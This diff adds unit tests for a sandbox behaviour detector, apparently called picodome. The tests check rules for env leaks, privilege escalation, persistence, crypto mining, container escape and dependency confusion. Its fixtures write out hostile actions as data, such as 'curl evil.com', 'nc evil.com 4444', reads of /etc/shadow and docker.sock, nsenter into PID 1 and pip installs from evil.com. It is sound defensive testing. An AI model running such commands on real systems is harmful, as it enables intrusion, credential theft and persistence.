@@ -11,6 +11,7 @@ from picodome.l4.models import (
     DnsQuery,
     FileOperation,
     NetworkCall,
+    ProcessSpawn,
 )
 from picodome.l4.profiler import profile_from_sandbox_result
 
@@ -169,6 +170,11 @@ class TestL4Engine:
         assert "L4-ENTROPY" in rules
         assert "L4-HONEY" in rules
         assert "L4-BASE" in rules
+        assert "L4-ENV" in rules
+        assert "L4-PROC" in rules
+        assert "L4-FS" in rules
+        assert "L4-NET" in rules
+        assert "L4-SC" in rules
 
     def test_engine_subset_rules(self):
         profile = BehavioralProfile(package="python", total_runtime_ms=100)
@@ -205,3 +211,559 @@ class TestEndToEnd:
         result = create_default_engine().analyze(profile)
         assert result.overall_verdict in (BehavioralVerdict.SUSPICIOUS, BehavioralVerdict.MALICIOUS)
         assert len(result.findings) > 0
+
+
+class TestL4EnvLeak:
+    def test_env_leak_detects_dotenv_access(self):
+        from picodome.l4.rules.env_leak import detect_env_leak
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path=".env", operation="read")],
+            network_calls=[],
+            dns_queries=[],
+            spawns=[],
+            total_runtime_ms=100,
+        )
+        findings = detect_env_leak(profile)
+        assert any(f.rule_id == "L4-ENV-001" for f in findings)
+
+    def test_env_leak_detects_env_dump_command(self):
+        from picodome.l4.rules.env_leak import detect_env_leak
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[],
+            network_calls=[],
+            dns_queries=[],
+            spawns=[ProcessSpawn(executable="/usr/bin/env", args=["env"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_env_leak(profile)
+        assert any(f.rule_id == "L4-ENV-003" for f in findings)
+
+    def test_env_leak_clean_profile(self):
+        from picodome.l4.rules.env_leak import detect_env_leak
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_env_leak(profile)
+        assert len(findings) == 0
+
+
+class TestL4ProcessAnomaly:
+    def test_detects_shell_spawn(self):
+        from picodome.l4.rules.process_anomaly import detect_process_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/bin/bash", args=["-c", "curl evil.com"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_process_anomalies(profile)
+        assert any(f.rule_id == "L4-PROC-001" for f in findings)
+
+    def test_detects_reverse_shell_tool(self):
+        from picodome.l4.rules.process_anomaly import detect_process_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/nc", args=["evil.com", "4444"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_process_anomalies(profile)
+        assert any(f.rule_id == "L4-PROC-002" for f in findings)
+
+    def test_detects_excessive_spawns(self):
+        from picodome.l4.rules.process_anomaly import detect_process_anomalies
+
+        spawns = [ProcessSpawn(executable=f"/usr/bin/cmd{i}", args=[]) for i in range(6)]
+        profile = BehavioralProfile(
+            package="suspicious-pkg",
+            spawns=spawns,
+            total_runtime_ms=100,
+        )
+        findings = detect_process_anomalies(profile)
+        assert any(f.rule_id == "L4-PROC-003" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.process_anomaly import detect_process_anomalies
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_process_anomalies(profile)
+        assert len(findings) == 0
+
+
+class TestL4FilesystemAnomaly:
+    def test_detects_protected_path_write(self):
+        from picodome.l4.rules.filesystem import detect_filesystem_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/passwd", operation="write")],
+            total_runtime_ms=100,
+        )
+        findings = detect_filesystem_anomalies(profile)
+        assert any(f.rule_id == "L4-FS-001" for f in findings)
+
+    def test_detects_path_traversal(self):
+        from picodome.l4.rules.filesystem import detect_filesystem_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="../../etc/shadow", operation="read")],
+            total_runtime_ms=100,
+        )
+        findings = detect_filesystem_anomalies(profile)
+        assert any(f.rule_id == "L4-FS-004" for f in findings)
+
+    def test_detects_critical_file_deletion(self):
+        from picodome.l4.rules.filesystem import detect_filesystem_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/passwd", operation="delete")],
+            total_runtime_ms=100,
+        )
+        findings = detect_filesystem_anomalies(profile)
+        assert any(f.rule_id == "L4-FS-003" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.filesystem import detect_filesystem_anomalies
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_filesystem_anomalies(profile)
+        assert len(findings) == 0
+
+
+class TestL4NetworkAnomaly:
+    def test_detects_suspicious_port(self):
+        from picodome.l4.rules.network import detect_network_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            network_calls=[NetworkCall(address="evil.com", port=4444)],
+            dns_queries=[],
+            total_runtime_ms=100,
+        )
+        findings = detect_network_anomalies(profile)
+        assert any(f.rule_id == "L4-NET-001" for f in findings)
+
+    def test_detects_suspicious_tld(self):
+        from picodome.l4.rules.network import detect_network_anomalies
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            network_calls=[],
+            dns_queries=[DnsQuery(hostname="evil.xyz")],
+            total_runtime_ms=100,
+        )
+        findings = detect_network_anomalies(profile)
+        assert any(f.rule_id == "L4-NET-003" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.network import detect_network_anomalies
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_network_anomalies(profile)
+        assert len(findings) == 0
+
+
+class TestL4SupplyChain:
+    def test_detects_dns_query_to_suspicious_host(self):
+        from picodome.l4.rules.supply_chain import detect_supply_chain_patterns
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            network_calls=[],
+            dns_queries=[DnsQuery(hostname="pastebin.com")],
+            total_runtime_ms=100,
+        )
+        findings = detect_supply_chain_patterns(profile)
+        assert any(f.rule_id == "L4-SC-005" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.supply_chain import detect_supply_chain_patterns
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_supply_chain_patterns(profile)
+        assert len(findings) == 0
+
+
+class TestL4PrivilegeEscalation:
+    def test_detects_sudoers_write(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/sudoers", operation="write")],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-001" for f in findings)
+
+    def test_detects_shadow_write(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/shadow", operation="write")],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-001" for f in findings)
+
+    def test_detects_sudo_spawn(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/sudo", args=["bash"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-002" for f in findings)
+
+    def test_detects_setuid_chmod(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="chmod 4755 /usr/bin/custom", operation="chmod")],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings)
+
+    def test_detects_capabilities_manipulation(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/sbin/setcap", args=["cap_setuid+ep", "/usr/bin/python3"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-004" for f in findings)
+
+    def test_detects_cron_manipulation(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/cron.d/malicious", operation="create")],
+            total_runtime_ms=100,
+        )
+        findings = detect_privilege_escalation(profile)
+        assert any(f.rule_id == "L4-PRIVESC-005" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.privilege_escalation import detect_privilege_escalation
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_privilege_escalation(profile)
+        assert len(findings) == 0
+
+
+class TestL4Persistence:
+    def test_detects_authorized_keys_write(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/home/user/.ssh/authorized_keys", operation="write")],
+            total_runtime_ms=100,
+        )
+        findings = detect_persistence(profile)
+        assert any(f.rule_id == "L4-PERSIST-001" for f in findings)
+
+    def test_detects_systemd_unit_creation(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/etc/systemd/system/evil.service", operation="create")],
+            total_runtime_ms=100,
+        )
+        findings = detect_persistence(profile)
+        assert any(f.rule_id == "L4-PERSIST-001" for f in findings)
+
+    def test_detects_crontab_spawn(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/crontab", args=["-l"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_persistence(profile)
+        assert any(f.rule_id == "L4-PERSIST-002" for f in findings)
+
+    def test_detects_systemctl_enable(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/systemctl", args=["enable", "evil.service"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_persistence(profile)
+        assert any(f.rule_id == "L4-PERSIST-003" for f in findings)
+
+    def test_detects_launchctl_load(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/bin/launchctl", args=["load", "-w", "/Library/LaunchAgents/evil.plist"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_persistence(profile)
+        assert any(f.rule_id == "L4-PERSIST-005" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.persistence import detect_persistence
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_persistence(profile)
+        assert len(findings) == 0
+
+
+class TestL4CryptoMining:
+    def test_detects_mining_pool_port(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            network_calls=[NetworkCall(address="pool.minexmr.com", port=3333)],
+            dns_queries=[],
+            total_runtime_ms=100,
+        )
+        findings = detect_crypto_mining(profile)
+        assert any(f.rule_id == "L4-CRYPTO-001" for f in findings)
+
+    def test_detects_xmrig_spawn(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/xmrig", args=["--url=stratum+tcp://pool:3333"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_crypto_mining(profile)
+        assert any(f.rule_id == "L4-CRYPTO-002" for f in findings)
+
+    def test_detects_mining_dns(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            dns_queries=[DnsQuery(hostname="pool.monero.crypto")],
+            total_runtime_ms=100,
+        )
+        findings = detect_crypto_mining(profile)
+        assert any(f.rule_id == "L4-CRYPTO-003" for f in findings)
+
+    def test_detects_mining_config_access(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/home/user/.xmrig/config.json", operation="read")],
+            total_runtime_ms=100,
+        )
+        findings = detect_crypto_mining(profile)
+        assert any(f.rule_id == "L4-CRYPTO-005" for f in findings)
+
+    def test_detects_mining_arguments(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/unknown-miner", args=["--url=stratum+tcp://pool:3333"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_crypto_mining(profile)
+        assert any(f.rule_id == "L4-CRYPTO-006" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.crypto_mining import detect_crypto_mining
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_crypto_mining(profile)
+        assert len(findings) == 0
+
+
+class TestL4ContainerEscape:
+    def test_detects_proc1_access(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/proc/1/cgroup", operation="read")],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-001" for f in findings)
+
+    def test_detects_docker_sock_access(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/var/run/docker.sock", operation="read")],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-001" for f in findings)
+
+    def test_detects_docker_spawn(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/docker", args=["run", "-it", "ubuntu"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-002" for f in findings)
+
+    def test_detects_cloud_metadata_access(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            network_calls=[NetworkCall(address="169.254.169.254", port=80)],
+            dns_queries=[],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-003" for f in findings)
+
+    def test_detects_proc_self_mountinfo(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/proc/self/mountinfo", operation="read")],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-004" for f in findings)
+
+    def test_detects_nsenter_spawn(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/nsenter", args=["-t", "1", "-m", "-u", "-i", "-n", "/bin/bash"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-005" for f in findings)
+
+    def test_detects_cloud_metadata_dns(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            dns_queries=[DnsQuery(hostname="metadata.google.internal")],
+            total_runtime_ms=100,
+        )
+        findings = detect_container_escape(profile)
+        assert any(f.rule_id == "L4-CONTAINER-006" for f in findings)
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.container_escape import detect_container_escape
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_container_escape(profile)
+        assert len(findings) == 0
+
+
+class TestL4DependencyConfusion:
+    def test_detects_internal_registry_dns(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            dns_queries=[DnsQuery(hostname="npm.internal.company.com")],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-001" for f in findings)
+
+    def test_detects_local_tld(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            dns_queries=[DnsQuery(hostname="myregistry.local")],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-001" for f in findings)
+
+    def test_detects_npm_publish(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/npm", args=["publish"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-002" for f in findings)
+
+    def test_detects_twine_upload(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/twine", args=["upload", "dist/*"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-002" for f in findings)
+
+    def test_detects_suspicious_pip_index_url(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/pip", args=["install", "--index-url=http://evil.com/simple", "pkg"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-003" for f in findings)
+
+    def test_detects_registry_override(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            spawns=[ProcessSpawn(executable="/usr/bin/pip", args=["install", "--extra-index-url=http://evil.com/simple", "pkg"])],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-004" for f in findings)
+
+    def test_detects_npmrc_write(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(
+            package="evil-pkg",
+            fs_ops=[FileOperation(path="/home/user/.npmrc", operation="write")],
+            total_runtime_ms=100,
+        )
+        findings = detect_dependency_confusion(profile)
+        assert any(f.rule_id == "L4-DEP-006" for f in findings)
+        # Write should be HIGH severity
+        npmrc_finding = [f for f in findings if f.rule_id == "L4-DEP-006"][0]
+        assert npmrc_finding.severity.value == "HIGH"
+
+    def test_clean_profile_no_findings(self):
+        from picodome.l4.rules.dependency_confusion import detect_dependency_confusion
+
+        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
+        findings = detect_dependency_confusion(profile)
+        assert len(findings) == 0
